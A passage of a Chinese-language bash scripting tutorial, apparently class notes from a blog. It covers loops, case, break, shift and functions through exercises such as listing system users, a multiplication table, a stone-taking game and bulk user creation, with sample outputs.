[ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">be=<span class="variable">$n2</span></span><br><span class="line">min=<span class="variable">$3</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">be=<span class="variable">$3</span></span><br><span class="line">min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">max=<span class="variable">$3</span></span><br><span class="line">be=<span class="variable">$n1</span></span><br><span class="line">min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br></pre></td></tr></table></figure><h3 id="for-语法格式"><a href="#for-语法格式" class="headerlink" title="for 语法格式"></a>for 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 取值范围</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围</h4><ul><li><p>以空格分割</p><pre><code>for i in 1 2 3for i in 5 7 10for i in a b c</code></pre><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>以{}罗列        {1..10}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以使用seq$(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">&#96;seq 1 10&#96;</span><br><span class="line">seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure></li></ul><h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol><li>统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid”</li><li>依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件</li><li>输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些</li><li>计算某个命令执行的时间</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 系统中一共有：`cat /etc/passwd |wc -l`个用户</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">username=<span class="variable">$i</span></span><br><span class="line">uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">系统中一共有：22个用户</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /var目录中一共有`ls -l /var/|wc -l`个文件</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/var目录中一共有21个文件</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入用户名："</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入文件SIZE的最大值："</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> 执行的时间为 <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz 执行的时间为 2</span><br></pre></td></tr></table></figure><h4 id="拓展题"><a href="#拓展题" class="headerlink" title="拓展题"></a>拓展题</h4><ol><li>画斜线正反<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li><li>写一个9*9乘法表</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#行数空格*数量</span></span><br><span class="line"><span class="comment">#1 0 1</span></span><br><span class="line"><span class="comment">#211</span></span><br><span class="line"><span class="comment">#321</span></span><br><span class="line"><span class="comment">#nn-11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-1))`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=22*2=4</span></span><br><span class="line"><span class="comment">#3*1=33*23*3</span></span><br><span class="line"><span class="comment">#9*19*29*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="variable">$(($i*$j)</span>) "</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure><h3 id="while-语法格式"><a href="#while-语法格式" class="headerlink" title="while 语法格式"></a>while 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">while condition 指的是判断的条件</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br><span class="line">数字的判断 字符的判断 文件的判断</span><br><span class="line">-gt 大于 -z 空 -d 文件是不是一个目录</span><br><span class="line">-ge 大于等于 =  字符相等 -f 是不是一个普通文件</span><br><span class="line">-lt 小于 != 字符不相等 -e 文件是不是存在</span><br><span class="line">-le 小于等于 -n 非空 </span><br><span class="line">-ne 不等于 -a 逻辑与</span><br><span class="line">-eq 等于 -o 逻辑或</span><br></pre></td></tr></table></figure><ol><li>当什么的时候就做什么,体验无限循环<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">当山峰没有棱角的时候</span><br><span class="line">当河水不再流</span><br><span class="line">。。。</span><br><span class="line">我哈哈ishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li>不满足条件跳出循环<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">判断/tmp/whilefile2是否存在，不存在的时候我们去创建</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li></ol><h3 id="until-语法格式"><a href="#until-语法格式" class="headerlink" title="until 语法格式"></a>until 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until condition --&gt; 不满足 condition, 则执行 cmd</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 连乘算法 while和until2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。userlist文件的格式如下：carol 777 tom uplookingnatasha 778 tom uplookingr1 779 tom uplooking3. 要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。[root@rhel6 ~]# cat /tmp/useraddlist1dabao 888 xuexi,it uplookinglucy 889 sales,it uplookinglily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">A=(<span class="variable">$a</span>)</span><br><span class="line">groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure><h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol><li>完成今天课上的所有练习题目</li><li>石子游戏：有n石子，谁拿到最后一个石子谁赢，<br>用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的</li><li>创建一个以今天日期为名的目录20160811;<br>将/目录下所有以.sh结尾的文件复制到新创建的目录中；<br>将该目录打包压缩存到/tmp目录下保存。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"游戏开始！请玩家指定石子的个数:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家指定每次取石子的最多个数:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+1)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家取石子:"</span> w</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"我取 <span class="variable">$((($n2+1)</span>-<span class="variable">$w</span>)) 个石子"</span></span><br><span class="line">q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+1)))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">[ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"你输了@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"我先取 <span class="variable">$k</span> 个石子"</span></span><br><span class="line">q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">q=<span class="variable">$n1</span></span><br><span class="line">HH</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="case-语法格式"><a href="#case-语法格式" class="headerlink" title="case 语法格式"></a>case 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case 取值 in</span><br><span class="line">取值 1)</span><br><span class="line">CMD1 ;</span><br><span class="line">cmd11;</span><br><span class="line">cmd12;;</span><br><span class="line">取值 2)</span><br><span class="line">CMD2 ;;</span><br><span class="line">取值 3)</span><br><span class="line">CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>* 代表除了以上所有的取值 , 做某一些操作</p><h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol><li>请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">exit;;</span><br><span class="line">*)</span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？no</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？iii</span><br><span class="line">请问你是否喜欢shell脚本？fuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">请问你是否喜欢shell脚本？...</span><br><span class="line">请问你是否喜欢shell脚本？^^^[[D</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br></pre></td></tr></table></figure><h3 id="continue-语法格式"><a href="#continue-语法格式" class="headerlink" title="continue 语法格式"></a>continue 语法格式</h3><pre><code>continue 作用于循环语句中 代表跳出这个循环进入下个循环 .</code></pre><h4 id="课堂练习-4"><a href="#课堂练习-4" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="2"><li>要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出）</li></ol><h3 id="break-语法格式"><a href="#break-语法格式" class="headerlink" title="break 语法格式"></a>break 语法格式</h3><pre><code>break 作用于循环语句中 代表直接跳出该循环 .</code></pre><h4 id="课堂练习-5"><a href="#课堂练习-5" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="3"><li>要求找出系统中属于student用户的一个文件.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="shift-语法格式"><a href="#shift-语法格式" class="headerlink" title="shift 语法格式"></a>shift 语法格式</h3><pre><code>位置参数</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 代表的是输入的第一个参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 代表的是输入的第二个参数 ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 代表的是 bash 程序本身名</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># 代表的是参数的个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; 超过的两位的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;或者<span class="variable">$&#123;@&#125;</span> 代表将所有位置参数</span></span><br><span class="line">shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 .</span><br></pre></td></tr></table></figure><h4 id="课堂练习-6"><a href="#课堂练习-6" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="4"><li>显示位置参数的值，以及可执行脚本名称，参数的总数</li></ol><h3 id="function-语法格式"><a href="#function-语法格式" class="headerlink" title="function 语法格式"></a>function 语法格式</h3><pre><code>functname (){shell commands}</code></pre><ul><li><p>函数的调用</p><ol><li>直接调用函数– 函数名</li><li>传入参数– 函数名 参数1 参数2 参数3</li><li>使用return返回函数结束状态</li></ol></li><li><p>函数中的局部变量和全局变量</p></li></ul><p>默认为全局变量，因此不同的函数不可以使用同一个变量；<br>如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。</p><ul><li>函数返回值 return<br>可以使用return命令来设置返回值；</li></ul><p>例如 return 0</p><figure class="highlight bash"><table><tr><td 